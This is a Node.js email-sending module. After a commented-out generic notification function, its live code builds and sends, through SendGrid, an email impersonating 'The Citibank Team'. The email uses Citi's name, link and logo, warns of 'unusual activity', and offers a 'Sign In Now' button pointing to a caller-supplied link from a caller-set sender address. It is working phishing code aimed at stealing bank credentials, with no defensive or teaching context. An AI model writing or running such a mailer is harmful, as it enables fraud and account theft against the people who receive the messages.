// const sgMail = require("@sendgrid/mail");
// const mailgen = require("mailgen");
// const dotenv = require("dotenv");

// dotenv.config();

// const template = new mailgen({
//   theme: "default",
//   product: {
//     name: "amberlothy",
//     link: "https://axel.com/",
//   },
// });

// sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// const generateFlexPayEmail = (name, message) => ({
//   body: {
//     name,
//     message,
//   },
// });

// const flexPayNotification = async (account, message) => {
//   const emailBody = generateFlexPayEmail(
//     `${message}`,
//     message,
//   );
//   const emailTemplate = template.generate(emailBody);

//   const msg = {
//     to: account.email,
//     from:   account.senderEmail,
//     subject: account.subject,
//     html: emailTemplate,
//   };
//   try {
//     await sgMail.send(msg);
//   } catch (error) {
//     console.log(error);
//     return "Internal server error";
//   }
// };

// module.exports =  flexPayNotification


const sgMail = require("@sendgrid/mail");
const mailgen = require("mailgen");
const dotenv = require("dotenv");

dotenv.config();

const template = new mailgen({
  theme: "default",
  product: {
    bgColor: '#22BC66',
    name: "The Citibank Team",
    link: "https://www.citi.com/",
    logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Citibank.svg/2560px-Citibank.svg.png",
  },
});

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const flexPayNotification = async (account, message) => {
    const email = {
        body: {
            title: 'You Have 1 New Security Message Alert!',
            intro: ['There is an important security upgrade available for your Online Banking. Recently, we have detected some unusual activity on your account.'],
            action: {
                button: {
                    color: '#a30606', // Optional action button color
                    text: 'Sign In Now',
                    link: account.message
                }
            },
            outro: [
            `<li> Know what\'s going on with your checking, ATM/Debit, credit cardother accounts </li>`,
            `<li> Receive alerts right to your email or wireless device </li>`,
            `<li style="font-weight: 600"> Get alerted when a transaction amount is higher than what you\'ve set </li>`
          ],
            signature: 'Best'
        }
    };

      const emailTemplate = template.generate(email);

    const mailOption = {
      to: account.email,
      from:   account.senderEmail,
      subject: account.subject,
      html: emailTemplate,
    }
    try {
        const sendmail = await sgMail.send(mailOption)

        return sendmail
    } catch (error) {
      console.log(error);
        return "Internal server error";
    }
}


module.exports =  flexPayNotification

